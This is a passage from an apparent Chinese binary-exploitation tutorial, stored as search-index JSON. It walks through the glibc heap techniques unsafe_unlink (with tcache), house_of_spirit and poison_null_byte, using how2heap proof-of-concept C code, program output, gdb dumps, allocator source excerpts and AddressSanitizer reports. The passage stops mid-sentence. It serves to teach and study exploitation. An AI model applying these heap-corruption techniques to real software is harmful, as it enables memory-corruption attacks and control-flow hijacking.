tcache\uff0c\u8fd9\u662f\u4e00\u79cd\u7ebf\u7a0b\u7f13\u5b58\u673a\u5236\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6709 64 \u4e2a\u5927\u5c0f\u9012\u589e\u7684 bins\uff0c\u6bcf\u4e2a bin \u662f\u4e00\u4e2a\u5355\u94fe\u8868\uff0c\u9ed8\u8ba4\u6700\u591a\u5305\u542b 7 \u4e2a chunk\u3002\u5176\u4e2d\u7f13\u5b58\u7684 chunk \u662f\u4e0d\u4f1a\u88ab\u5408\u5e76\u7684\uff0c\u6240\u4ee5\u5728\u91ca\u653e chunk 1 \u7684\u65f6\u5019\uff0c chunk0_ptr \u4ecd\u7136\u6307\u5411\u6b63\u786e\u7684\u5806\u5730\u5740\uff0c\u800c\u4e0d\u662f\u4e4b\u524d\u7684 chunk0_ptr = P = P->fd \u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u4e00\u79cd\u53ef\u80fd\u7684\u529e\u6cd5\u662f\u7ed9\u586b\u5145\u8fdb\u7279\u5b9a\u5927\u5c0f\u7684 chunk \u628a bin \u5360\u6ee1\uff0c\u5c31\u50cf\u4e0b\u9762\u8fd9\u6837\uff1a // deal with tcache int *a[10]; int i; for (i = 0; i < 7; i++) { a[i] = malloc(0x80); } for (i = 0; i < 7; i++) { free(a[i]); } gef\u27a4 p &chunk0_ptr $2 = (uint64_t **) 0x555555755070 <chunk0_ptr> gef\u27a4 x/gx 0x555555755070 0x555555755070 <chunk0_ptr>: 0x00007fffffffdd0f gef\u27a4 x/gx 0x00007fffffffdd0f 0x7fffffffdd0f: 0x4242424242424242 \u73b0\u5728 libc-2.26 \u7248\u672c\u4e0b\u4e5f\u6210\u529f\u5229\u7528\u4e86\u3002tcache \u662f\u4e2a\u5f88\u6709\u8da3\u7684\u4e1c\u897f\uff0c\u66f4\u8be6\u7ec6\u7684\u5185\u5bb9\u6211\u4eec\u4f1a\u5728\u4e13\u95e8\u7684\u7ae0\u8282\u91cc\u53bb\u8bb2\u3002 \u52a0\u4e0a\u5185\u5b58\u68c0\u6d4b\u53c2\u6570\u91cd\u65b0\u7f16\u8bd1\uff0c\u53ef\u4ee5\u770b\u5230 heap-buffer-overflow\uff1a $ gcc -fsanitize=address -g unsafe_unlink.c $ ./a.out The global chunk0_ptr is at 0x602230, pointing to 0x60c00000bf80 The victim chunk we are going to corrupt is at 0x60c00000bec0 Fake chunk fd: 0x602218 Fake chunk bk: 0x602220 ================================================================= ==5591==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60c00000beb0 at pc 0x000000400d74 bp 0x7ffd06423730 sp 0x7ffd06423720 WRITE of size 8 at 0x60c00000beb0 thread T0 #0 0x400d73 in main /home/firmy/how2heap/unsafe_unlink.c:26 #1 0x7fc925d8282f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #2 0x400968 in _start (/home/firmy/how2heap/a.out+0x400968) 0x60c00000beb0 is located 16 bytes to the left of 128-byte region [0x60c00000bec0,0x60c00000bf40) allocated by thread T0 here: #0 0x7fc9261c4602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602) #1 0x400b12 in main /home/firmy/how2heap/unsafe_unlink.c:13 #2 0x7fc925d8282f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)","title":"unsafe_unlink"},{"location":"Tutorial/Material/Binary%20Exploitation/#house_of_spirit","text":"#include <stdio.h> #include <stdlib.h> int main() { malloc(1); fprintf(stderr, \"We will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks.\\n\"); unsigned long long *a, *b; unsigned long long fake_chunks[10] __attribute__ ((aligned (16))); fprintf(stderr, \"The first one: %p\\n\", &fake_chunks[0]); fprintf(stderr, \"The second one: %p\\n\", &fake_chunks[4]); fake_chunks[1] = 0x20; // the size fake_chunks[5] = 0x1234; // nextsize fake_chunks[2] = 0x4141414141414141LL; fake_chunks[6] = 0x4141414141414141LL; fprintf(stderr, \"Overwritting our pointer with the address of the fake region inside the fake first chunk, %p.\\n\", &fake_chunks[0]); a = &fake_chunks[2]; fprintf(stderr, \"Freeing the overwritten pointer.\\n\"); free(a); fprintf(stderr, \"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\\n\", &fake_chunks[0], &fake_chunks[2]); b = malloc(0x10); fprintf(stderr, \"malloc(0x10): %p\\n\", b); b[0] = 0x4242424242424242LL; } $ gcc -g house_of_spirit.c $ ./a.out We will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks. The first one: 0x7ffc782dae00 The second one: 0x7ffc782dae20 Overwritting our pointer with the address of the fake region inside the fake first chunk, 0x7ffc782dae00. Freeing the overwritten pointer. Now the next malloc will return the region of our fake chunk at 0x7ffc782dae00, which will be 0x7ffc782dae10! malloc(0x10): 0x7ffc782dae10 house-of-spirit \u662f\u4e00\u79cd fastbins \u653b\u51fb\u65b9\u6cd5\uff0c\u901a\u8fc7\u6784\u9020 fake chunk\uff0c\u7136\u540e\u5c06\u5176 free \u6389\uff0c\u5c31\u53ef\u4ee5\u5728\u4e0b\u4e00\u6b21 malloc \u65f6\u8fd4\u56de fake chunk \u7684\u5730\u5740\uff0c\u5373\u4efb\u610f\u6211\u4eec\u53ef\u63a7\u7684\u533a\u57df\u3002house-of-spirit \u662f\u4e00\u79cd\u901a\u8fc7\u5806\u7684 fast bin \u673a\u5236\u6765\u8f85\u52a9\u6808\u6ea2\u51fa\u7684\u65b9\u6cd5\uff0c\u4e00\u822c\u7684\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684\u5229\u7528\u90fd\u5e0c\u671b\u80fd\u591f\u8986\u76d6\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4ee5\u63a7\u5236 EIP \u6765\u52ab\u6301\u63a7\u5236\u6d41\uff0c\u4f46\u5982\u679c\u6808\u6ea2\u51fa\u7684\u957f\u5ea6\u65e0\u6cd5\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u540c\u65f6\u5374\u53ef\u4ee5\u8986\u76d6\u6808\u4e0a\u7684\u4e00\u4e2a\u5373\u5c06\u88ab free \u7684\u5806\u6307\u9488\uff0c\u6b64\u65f6\u53ef\u4ee5\u5c06\u8fd9\u4e2a\u6307\u9488\u6539\u5199\u4e3a\u6808\u4e0a\u7684\u5730\u5740\u5e76\u5728\u76f8\u5e94\u4f4d\u7f6e\u6784\u9020\u4e00\u4e2a fast bin \u5757\u7684\u5143\u6570\u636e\uff0c\u63a5\u7740\u5728 free \u64cd\u4f5c\u65f6\uff0c\u8fd9\u4e2a\u6808\u4e0a\u7684\u5806\u5757\u88ab\u653e\u5230 fast bin \u4e2d\uff0c\u4e0b\u4e00\u6b21 malloc \u5bf9\u5e94\u7684\u5927\u5c0f\u65f6\uff0c\u7531\u4e8e fast bin \u7684\u5148\u8fdb\u540e\u51fa\u673a\u5236\uff0c\u8fd9\u4e2a\u6808\u4e0a\u7684\u5806\u5757\u88ab\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u518d\u6b21\u5199\u5165\u65f6\u5c31\u53ef\u80fd\u9020\u6210\u8fd4\u56de\u5730\u5740\u7684\u6539\u5199\u3002\u6240\u4ee5\u5229\u7528\u7684\u7b2c\u4e00\u6b65\u4e0d\u662f\u53bb\u63a7\u5236\u4e00\u4e2a chunk\uff0c\u800c\u662f\u63a7\u5236\u4f20\u7ed9 free \u51fd\u6570\u7684\u6307\u9488\uff0c\u5c06\u5176\u6307\u5411\u4e00\u4e2a fake chunk\u3002\u6240\u4ee5 fake chunk \u7684\u4f2a\u9020\u662f\u5173\u952e\u3002 \u9996\u5148 malloc(1) \u7528\u4e8e\u521d\u59cb\u5316\u5185\u5b58\u73af\u5883\uff0c\u7136\u540e\u5728 fake chunk \u533a\u57df\u4f2a\u9020\u51fa\u4e24\u4e2a chunk\u3002\u53e6\u5916\u6b63\u5982\u4e0a\u9762\u6240\u8bf4\u7684\uff0c\u9700\u8981\u4e00\u4e2a\u4f20\u9012\u7ed9 free \u51fd\u6570\u7684\u53ef\u4ee5\u88ab\u4fee\u6539\u7684\u6307\u9488\uff0c\u65e0\u8bba\u662f\u901a\u8fc7\u6808\u6ea2\u51fa\u8fd8\u662f\u5176\u5b83\u4ec0\u4e48\u65b9\u5f0f\uff1a gef\u27a4 x/10gx &fake_chunks 0x7fffffffdcb0: 0x0000000000000000 0x0000000000000020 <-- fake chunk 1 0x7fffffffdcc0: 0x4141414141414141 0x0000000000000000 0x7fffffffdcd0: 0x0000000000000001 0x0000000000001234 <-- fake chunk 2 0x7fffffffdce0: 0x4141414141414141 0x0000000000000000 gef\u27a4 x/gx &a 0x7fffffffdca0: 0x0000000000000000 \u4f2a\u9020 chunk \u65f6\u9700\u8981\u7ed5\u8fc7\u4e00\u4e9b\u68c0\u67e5\uff0c\u9996\u5148\u662f\u6807\u5fd7\u4f4d\uff0c PREV_INUSE \u4f4d\u5e76\u4e0d\u5f71\u54cd free \u7684\u8fc7\u7a0b\uff0c\u4f46 IS_MMAPPED \u4f4d\u548c NON_MAIN_ARENA \u4f4d\u90fd\u8981\u4e3a\u96f6\u3002\u5176\u6b21\uff0c\u5728 64 \u4f4d\u7cfb\u7edf\u4e2d fast chunk \u7684\u5927\u5c0f\u8981\u5728 32~128 \u5b57\u8282\u4e4b\u95f4\u3002\u6700\u540e\uff0c\u662f next chunk \u7684\u5927\u5c0f\uff0c\u5fc5\u987b\u5927\u4e8e 2*SIZE_SZ \uff08\u5373\u5927\u4e8e16\uff09\uff0c\u5c0f\u4e8e av->system_mem \uff08\u5373\u5c0f\u4e8e128kb\uff09\uff0c\u624d\u80fd\u7ed5\u8fc7\u5bf9 next chunk \u5927\u5c0f\u7684\u68c0\u67e5\u3002 libc-2.23 \u4e2d\u8fd9\u4e9b\u68c0\u67e5\u4ee3\u7801\u5982\u4e0b\uff1a void __libc_free (void *mem) { mstate ar_ptr; mchunkptr p; /* chunk corresponding to mem */ [...] p = mem2chunk (mem); if (chunk_is_mmapped (p)) /* release mmapped memory. */ { [...] munmap_chunk (p); return; } ar_ptr = arena_for_chunk (p); // \u83b7\u5f97 chunk \u6240\u5c5e arena \u7684\u5730\u5740 _int_free (ar_ptr, p, 0); // \u5f53 IS_MMAPPED \u4e3a\u96f6\u65f6\u8c03\u7528 } mem \u5c31\u662f\u6211\u4eec\u6240\u63a7\u5236\u7684\u4f20\u9012\u7ed9 free \u51fd\u6570\u7684\u5730\u5740\u3002\u5176\u4e2d\u4e0b\u9762\u4e24\u4e2a\u51fd\u6570\u7528\u4e8e\u5728 chunk \u6307\u9488\u548c malloc \u6307\u9488\u4e4b\u95f4\u505a\u8f6c\u6362\uff1a /* conversion from malloc headers to user pointers, and back */ #define chunk2mem(p) ((void*)((char*)(p) + 2*SIZE_SZ)) #define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ)) \u5f53 NON_MAIN_ARENA \u4e3a\u96f6\u65f6\u8fd4\u56de main arena\uff1a /* find the heap and corresponding arena for a given ptr */ #define heap_for_ptr(ptr) \\ ((heap_info *) ((unsigned long) (ptr) & ~(HEAP_MAX_SIZE - 1))) #define arena_for_chunk(ptr) \\ (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)->ar_ptr : &main_arena) \u8fd9\u6837\uff0c\u7a0b\u5e8f\u5c31\u987a\u5229\u5730\u8fdb\u5165\u4e86 _int_free \u51fd\u6570\uff1a static void _int_free (mstate av, mchunkptr p, int have_lock) { INTERNAL_SIZE_T size; /* its size */ mfastbinptr *fb; /* associated fastbin */ [...] size = chunksize (p); [...] /* If eligible, place chunk on a fastbin so it can be found and used quickly in malloc. */ if ((unsigned long)(size) <= (unsigned long)(get_max_fast ()) #if TRIM_FASTBINS /* If TRIM_FASTBINS set, don't place chunks bordering top into fastbins */ && (chunk_at_offset(p, size) != av->top) #endif ) { if (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize (chunk_at_offset (p, size)) >= av->system_mem, 0)) { [...] errstr = \"free(): invalid next size (fast)\"; goto errout; } [...] set_fastchunks(av); unsigned int idx = fastbin_index(size); fb = &fastbin (av, idx); /* Atomically link P to its fastbin: P->FD = *FB; *FB = P; */ mchunkptr old = *fb, old2; [...] do { [...] p->fd = old2 = old; } while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); \u5176\u4e2d\u4e0b\u9762\u7684\u5b8f\u51fd\u6570\u7528\u4e8e\u83b7\u5f97 next chunk\uff1a /* Treat space at ptr + offset as a chunk */ #define chunk_at_offset(p, s) ((mchunkptr) (((char *) (p)) + (s))) \u7136\u540e\u4fee\u6539\u6307\u9488 a \u6307\u5411 (fake chunk 1 + 0x10) \u7684\u4f4d\u7f6e\uff0c\u5373\u4e0a\u9762\u63d0\u5230\u7684 mem \u3002\u7136\u540e\u5c06\u5176\u4f20\u9012\u7ed9 free \u51fd\u6570\uff0c\u8fd9\u65f6\u7a0b\u5e8f\u5c31\u4f1a\u8bef\u4ee5\u4e3a\u8fd9\u662f\u4e00\u5757\u771f\u7684 chunk\uff0c\u7136\u540e\u5c06\u5176\u91ca\u653e\u5e76\u52a0\u5165\u5230 fastbin \u4e2d\u3002 gef\u27a4 x/gx &a 0x7fffffffdca0: 0x00007fffffffdcc0 gef\u27a4 x/10gx &fake_chunks 0x7fffffffdcb0: 0x0000000000000000 0x0000000000000020 <-- fake chunk 1 [be freed] 0x7fffffffdcc0: 0x0000000000000000 0x0000000000000000 0x7fffffffdcd0: 0x0000000000000001 0x0000000000001234 <-- fake chunk 2 0x7fffffffdce0: 0x4141414141414141 0x0000000000000000 0x7fffffffdcf0: 0x0000000000400820 0x00000000004005b0 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] \u2190 Chunk(addr=0x7fffffffdcc0, size=0x20, flags=) \u8fd9\u65f6\u5982\u679c\u6211\u4eec malloc \u4e00\u4e2a\u5bf9\u5e94\u5927\u5c0f\u7684 fast chunk\uff0c\u7a0b\u5e8f\u5c06\u4ece fastbins \u4e2d\u5206\u914d\u51fa\u8fd9\u5757\u88ab\u91ca\u653e\u7684 chunk\u3002 gef\u27a4 x/10gx &fake_chunks 0x7fffffffdcb0: 0x0000000000000000 0x0000000000000020 <-- new chunk 0x7fffffffdcc0: 0x4242424242424242 0x0000000000000000 0x7fffffffdcd0: 0x0000000000000001 0x0000000000001234 <-- fake chunk 2 0x7fffffffdce0: 0x4141414141414141 0x0000000000000000 0x7fffffffdcf0: 0x0000000000400820 0x00000000004005b0 gef\u27a4 x/gx &b 0x7fffffffdca8: 0x00007fffffffdcc0 \u6240\u4ee5 house-of-spirit \u7684\u4e3b\u8981\u76ee\u7684\u662f\uff0c\u5f53\u6211\u4eec\u4f2a\u9020\u7684 fake chunk \u5185\u90e8\u5b58\u5728\u4e0d\u53ef\u63a7\u533a\u57df\u65f6\uff0c\u8fd0\u7528\u8fd9\u4e00\u6280\u672f\u53ef\u4ee5\u5c06\u8fd9\u7247\u533a\u57df\u53d8\u6210\u53ef\u63a7\u7684\u3002\u4e0a\u9762\u4e3a\u4e86\u65b9\u4fbf\u89c2\u5bdf\uff0c\u5728 fake chunk \u91cc\u586b\u5145\u4e00\u4e9b\u5b57\u6bcd\uff0c\u4f46\u5728\u73b0\u5b9e\u4e2d\u8fd9\u4e9b\u4f4d\u7f6e\u5f88\u53ef\u80fd\u662f\u4e0d\u53ef\u63a7\u7684\uff0c\u800c house-of-spirit \u4e5f\u6b63\u662f\u4ee5\u6b64\u4e3a\u76ee\u7684\u800c\u51fa\u73b0\u7684\u3002 \u8be5\u6280\u672f\u7684\u7f3a\u70b9\u4e5f\u662f\u9700\u8981\u5bf9\u6808\u5730\u5740\u8fdb\u884c\u6cc4\u6f0f\uff0c\u5426\u5219\u65e0\u6cd5\u6b63\u786e\u8986\u76d6\u9700\u8981\u91ca\u653e\u7684\u5806\u6307\u9488\uff0c\u4e14\u5728\u6784\u9020\u6570\u636e\u65f6\uff0c\u9700\u8981\u6ee1\u8db3\u5bf9\u9f50\u7684\u8981\u6c42\u7b49\u3002 \u52a0\u4e0a\u5185\u5b58\u68c0\u6d4b\u53c2\u6570\u91cd\u65b0\u7f16\u8bd1\uff0c\u53ef\u4ee5\u770b\u5230\u95ee\u9898\u6240\u5728\uff0c\u5373\u5c1d\u8bd5 free \u4e00\u5757\u4e0d\u662f\u7531 malloc \u5206\u914d\u7684 chunk\uff1a $ gcc -fsanitize=address -g house_of_spirit.c $ ./a.out We will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks. The first one: 0x7fffa61d6c00 The second one: 0x7fffa61d6c20 Overwritting our pointer with the address of the fake region inside the fake first chunk, 0x7fffa61d6c00. Freeing the overwritten pointer. ================================================================= ==5282==ERROR: AddressSanitizer: attempting free on address which was not malloc()-ed: 0x7fffa61d6c10 in thread T0 #0 0x7fc4c3a332ca in __interceptor_free (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x982ca) #1 0x400cab in main /home/firmyy/how2heap/house_of_spirit.c:24 #2 0x7fc4c35f182f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #3 0x4009b8 in _start (/home/firmyy/how2heap/a.out+0x4009b8) house-of-spirit \u5728 libc-2.26 \u4e0b\u7684\u5229\u7528\u53ef\u4ee5\u67e5\u770b\u7ae0\u8282 4.14\u3002","title":"house_of_spirit"},{"location":"Tutorial/Material/Binary%20Exploitation/#317-linux","text":"how2heap poison_null_byte house_of_lore overlapping_chunks overlapping_chunks_2 \u4e0b\u8f7d\u6587\u4ef6","title":"3.1.7 Linux \u5806\u5229\u7528\uff08\u4e2d\uff09"},{"location":"Tutorial/Material/Binary%20Exploitation/#how2heap_1","text":"","title":"how2heap"},{"location":"Tutorial/Material/Binary%20Exploitation/#poison_null_byte","text":"#include <stdio.h> #include <stdlib.h> #include <string.h> #include <stdint.h> #include <malloc.h> int main() { uint8_t *a, *b, *c, *b1, *b2, *d; a = (uint8_t*) malloc(0x10); int real_a_size = malloc_usable_size(a); fprintf(stderr, \"We allocate 0x10 bytes for 'a': %p\\n\", a); fprintf(stderr, \"'real' size of 'a': %#x\\n\", real_a_size); b = (uint8_t*) malloc(0x100); c = (uint8_t*) malloc(0x80); fprintf(stderr, \"b: %p\\n\", b); fprintf(stderr, \"c: %p\\n\", c); uint64_t* b_size_ptr = (uint64_t*)(b - 0x8); *(size_t*)(b+0xf0) = 0x100; fprintf(stderr, \"b.size: %#lx ((0x100 + 0x10) | prev_in_use)\\n\\n\", *b_size_ptr); // deal with tcache // int *k[10], i; // for (i = 0; i < 7; i++) { // k[i] = malloc(0x100); // } // for (i = 0; i < 7; i++) { // free(k[i]); // } free(b); uint64_t* c_prev_size_ptr = ((uint64_t*)c) - 2; fprintf(stderr, \"After free(b), c.prev_size: %#lx\\n\", *c_prev_size_ptr); a[real_a_size] = 0; // <--- THIS IS THE \"EXPLOITED BUG\" fprintf(stderr, \"We overflow 'a' with a single null byte into the metadata of 'b'\\n\"); fprintf(stderr, \"b.size: %#lx\\n\\n\", *b_size_ptr); fprintf(stderr, \"Pass the check: chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\\n\", *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8)))); b1 = malloc(0x80); memset(b1, 'A', 0x80); fprintf(stderr, \"We malloc 'b1': %p\\n\", b1); fprintf(stderr, \"c.prev_size: %#lx\\n\", *c_prev_size_ptr); fprintf(stderr, \"fake c.prev_size: %#lx\\n\\n\", *(((uint64_t*)c)-4)); b2 = malloc(0x40); memset(b2, 'A', 0x40); fprintf(stderr, \"We malloc 'b2', our 'victim' chunk: %p\\n\", b2); // deal with tcache // for (i = 0; i < 7; i++) { // k[i] = malloc(0x80); // } // for (i = 0; i < 7; i++) { // free(k[i]); // } free(b1); free(c); fprintf(stderr, \"Now we free 'b1' and 'c', this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\\n\"); d = malloc(0x110); fprintf(stderr, \"Finally, we allocate 'd', overlapping 'b2': %p\\n\\n\", d); fprintf(stderr, \"b2 content:%s\\n\", b2); memset(d, 'B', 0xb0); fprintf(stderr, \"New b2 content:%s\\n\", b2); } $ gcc -g poison_null_byte.c $ ./a.out We allocate 0x10 bytes for 'a': 0xabb010 'real' size of 'a': 0x18 b: 0xabb030 c: 0xabb140 b.size: 0x111 ((0x100 + 0x10) | prev_in_use) After free(b), c.prev_size: 0x110 We overflow 'a' with a single null byte into the metadata of 'b' b.size: 0x100 Pass the check: chunksize(P) == 0x100 == 0x100 == prev_size (next_chunk(P)) We malloc 'b1': 0xabb030 c.prev_size: 0x110 fake c.prev_size: 0x70 We malloc 'b2', our 'victim' chunk: 0xabb0c0 Now we free 'b1' and 'c', this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2'). Finally, we allocate 'd', overlapping 'b2': 0xabb030 b2 content:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA New b2 content:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \u8be5\u6280\u672f\u9002\u7528\u7684\u573a\u666f\u9700\u8981\u67d0\u4e2a malloc \u7684\u5185\u5b58\u533a\u57df\u5b58\u5728\u4e00\u4e2a\u5355\u5b57\u8282\u6ea2\u51fa\u6f0f\u6d1e\u3002\u901a\u8fc7\u6ea2\u51fa\u4e0b\u4e00\u4e2a chunk \u7684 size \u5b57\u6bb5\uff0c\u653b\u51fb\u8005\u80fd\u591f\u5728\u5806\u4e2d\u521b\u9020\u51fa\u91cd\u53e0\u7684\u5185\u5b58\u5757\uff0c\u4ece\u800c\u8fbe\u5230\u6539\u5199\u5176\u4ed6\u6570\u636e\u7684\u76ee\u7684\u3002\u518d\u7ed3\u5408\u5176\u4ed6\u7684\u5229\u7528\u65b9\u5f0f\uff0c\u540c\u6837\u80fd\u591f\u83b7\u5f97\u7a0b\u5e8f\u7684\u63a7\u5236\u6743\u3002 \u5bf9\u4e8e\u5355\u5b57\u8282\u6ea2\u51fa\u7684\u5229\u7528\u6709\u4e0b\u9762\u51e0\u79cd\uff1a \u6269\u5c55\u88ab\u91ca\u653e\u5757\uff1a\u5f53\u6ea2\u51fa\u5757\u7684\u4e0b\u4e00\u5757\u4e3a\u88ab\u91ca\u653e\u5757\u4e14\u5904\u4e8e unsorted bin \u4e2d\uff0c\u5219\u901a\u8fc7\u6ea2\u51fa\u4e00\u4e2a\u5b57\u8282\u6765\u5c06\u5176\u5927\u5c0f\u6269\u5927\uff0c\u4e0b\u6b21\u53d6\u5f97\u6b21\u5757\u65f6\u5c31\u610f\u5473\u7740\u5176\u540e\u7684\u5757\u5c06\u88ab\u8986\u76d6\u800c\u9020\u6210\u8fdb\u4e00\u6b65\u7684\u6ea2\u51fa 0x100 0x100 0x80 |-------|-------|-------| | A | B | C | \u521d\u59cb\u72b6\u6001 |-------|-------|-------| | A | B | C | \u91ca\u653e B |-------|-------|-------| | A | B | C | \u6ea2\u51fa B \u7684 size \u4e3a 0x180 |-------|-------|-------| | A | B | C | malloc(0x180-8) |-------|-------|-------| C \u5757\u88ab\u8986\u76d6 |<--\u5b9e\u9645\u5f97\u5230\u7684\u5757->| \u6269\u5c55\u5df2\u5206\u914d\u5757\uff1a\u5f53\u6ea2\u51fa\u5757\u7684\u4e0b\u4e00\u5757\u4e3a\u4f7f\u7528\u4e2d\u7684\u5757\uff0c\u5219\u9700\u8981\u5408\u7406\u63a7\u5236\u6ea2\u51fa\u7684\u5b57\u8282\uff0c\u4f7f\u5176\u88ab\u91ca\u653e\u65f6\u7684\u5408\u5e76\u64cd\u4f5c\u80fd\u591f\u987a\u5229\u8fdb\u884c\uff0c\u4f8b\u5982\u76f4\u63a5\u52a0\u4e0a\u4e0b\u4e00\u5757\u7684\u5927\u5c0f\u4f7f\u5176\u5b8c\u5168\u88ab\u8986\u76d6\u3002\u4e0b\u4e00\u6b21\u5206\u914d\u5bf9\u5e94\u5927\u5c0f\u65f6\uff0c\u5373\u53ef\u53d6\u5f97\u5df2\u7ecf\u88ab\u6269\u5927\u7684\u5757\uff0c\u5e76\u9020\u6210\u8fdb\u4e00\u6b65\u6ea2\u51fa 0x100 0x100 0x80 |-------|-------|-------| | A | B | C | \u521d\u59cb\u72b6\u6001 |-------|-------|-------| | A | B | C | \u6ea2\u51fa B \u7684 size \u4e3a 0x180 |-------|-------|-------| | A | B | C | \u91ca\u653e B |-------|-------|-------| | A | B | C | malloc(0x180-8) |-------|-------|-------| C \u5757\u88ab\u8986\u76d6 |<--\u5b9e\u9645\u5f97\u5230\u7684\u5757->| \u6536\u7f29\u88ab\u91ca\u653e\u5757\uff1a\u6b64\u60c5\u51b5\u9488\u5bf9\u6ea2\u51fa\u7684\u5b57\u8282\u53ea\u80fd\u4e3a 0 \u7684\u65f6\u5019\uff0c\u4e5f\u5c31\u662f\u672c\u8282\u6240\u8bf4\u7684 poison-null-byte\uff0c\u6b64\u65f6\u5c06\u4e0b\u4e00\u4e2a\u88ab\u91ca\u653e\u7684\u5757\u5927\u5c0f\u7f29\u5c0f\uff0c\u5982\u6b64\u4e00\u6765\u5728\u4e4b\u540e\u5206\u88c2\u6b64\u5757\u65f6\u5c06\u65e0\u6cd5\u6b63\u786e\u66f4\u65b0\u540e\u4e00\u5757\u7684 prev_size \u5b57\u6bb5\uff0c\u5bfc\u81f4\u91ca\u653e\u65f6\u51fa\u73b0\u91cd\u53e0\u7684\u5806\u5757 0x100 0x210 0x80 |-------|---------------|-------| | A | B | C | \u521d\u59cb\u72b6\u6001 |-------|---------------|-------| | A | B | C | \u91ca\u653e B |-------|---------------|-------| | A | B | C | \u6ea2\u51fa B \u7684 size \u4e3a 0x200 |-------|---------------|-------| \u4e4b\u540e\u7684 malloc \u64cd\u4f5c\u6ca1\u6709\u66f4\u65b0 C \u7684 prev_size 0x100 0x80 |-------|------|-----|--|-------| | A | B1 | B2 | | C | malloc(0x180-8), malloc(0x80-8) |-------|------|-----|--|-------| | A | B1 | B2 | | C | \u91ca\u653e B1 |-------|------|-----|--|-------| | A | B1 | B2 | | C | \u91ca\u653e C\uff0cC \u5c06\u4e0e B1 \u5408\u5e76 |-------|------|-----|--|-------| | A | B1 | B2 | | C | malloc(0x180-8) |-------|------|-----|--|-------| B2 \u5c06\u88ab\u8986\u76d6 |<\u5b9e\u9645\u5f97\u5230\u7684\u5757>| house of einherjar\uff1a\u4e5f\u662f\u6ea2\u51fa\u5b57\u8282\u53ea\u80fd\u4e3a 0 \u7684\u60c5\u51b5\uff0c\u5f53\u5b83\u662f\u66f4\u65b0\u6ea2\u51fa\u5757\u4e0b\u4e00\u5757\u7684 prev_size \u5b57\u6bb5\uff0c\u4f7f\u5176\u5728\u88ab\u91ca\u653e\u65f6\u80fd\u591f\u627e\u5230\u4e4b\u524d\u4e00\u4e2a\u5408\u6cd5\u7684\u88ab\u91ca\u653e\u5757\u5e76\u4e0e\u5176\u5408\u5e76\uff0c\u9020\u6210\u5806\u5757\u91cd\u53e0 0x100 0x100 0x101 |-------|-------|-------| | A | B | C | \u521d\u59cb\u72b6\u6001 |-------|-------|-------| | A | B | C | \u91ca\u653e A |-------|-------|-------| | A | B | C | \u6ea2\u51fa B\uff0c\u8986\u76d6 C \u5757\u7684 size \u4e3a 0x200\uff0c\u5e76\u4f7f\u5176 prev_size \u4e3a 0x200 |-------|-------|-------| | A | B | C | \u91ca\u653e C |-------|-------|-------| | A | B | C | C \u5c06\u4e0e A \u5408\u5e76 |-------|-------|-------| B \u5757\u88ab\u91cd\u53e0 |<-----\u5b9e\u9645\u5f97\u5230\u7684\u5757------>| \u9996\u5148\u5206\u914d\u4e09\u4e2a chunk\uff0c\u7b2c\u4e00\u4e2a chunk \u7c7b\u578b\u65e0\u6240\u8c13\uff0c\u4f46\u540e\u4e24\u4e2a\u4e0d\u80fd\u662f fast chunk\uff0c\u56e0\u4e3a fast chunk \u5728\u91ca\u653e\u540e\u4e0d\u4f1a\u88ab\u5408\u5e76\u3002\u8fd9\u91cc chunk a \u7528\u4e8e\u5236\u9020\u5355\u5b57\u8282\u6ea2\u51fa\uff0c\u53bb\u8986\u76d6 chunk b \u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\uff0cchunk c \u7684\u4f5c\u7528\u662f\u5e2e\u52a9\u4f2a\u9020 fake chunk\u3002 \u9996\u5148\u662f\u6ea2\u51fa\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u77e5\u9053\u4e00\u4e2a\u5806\u5757\u5b9e\u9645\u53ef\u7528\u7684\u5185\u5b58\u5927\u5c0f\uff08\u56e0\u4e3a\u7a7a\u95f4\u590d\u7528\uff0c\u53ef\u80fd\u4f1a\u6bd4\u5206\u914d\u65f6\u8981\u5927\u4e00\u70b9\uff09\uff0c\u7528\u4e8e\u83b7\u5f97\u8be5\u5927\u5c0f\u7684\u51fd\u6570 malloc_usable_size \u5982\u4e0b\uff1a /* ------------------------- malloc_usable_size ------------------------- */ static size_t musable (void *mem) { mchunkptr p; if (mem != 0) { p = mem2chunk (mem); [...] if (chunk_is_mmapped (p)) return chunksize (p) - 2 * SIZE_SZ; else if (inuse (p)) return chunksize (p) - SIZE_SZ; } return 0; } /* check for mmap()'ed chunk */ #define chunk_is_mmapped(p) ((p)->size & IS_MMAPPED) /* extract p's inuse bit */ #define inuse(p) \\ ((((mchunkptr) (((char *) (p)) + ((p)->size & ~SIZE_BITS)))->size) & 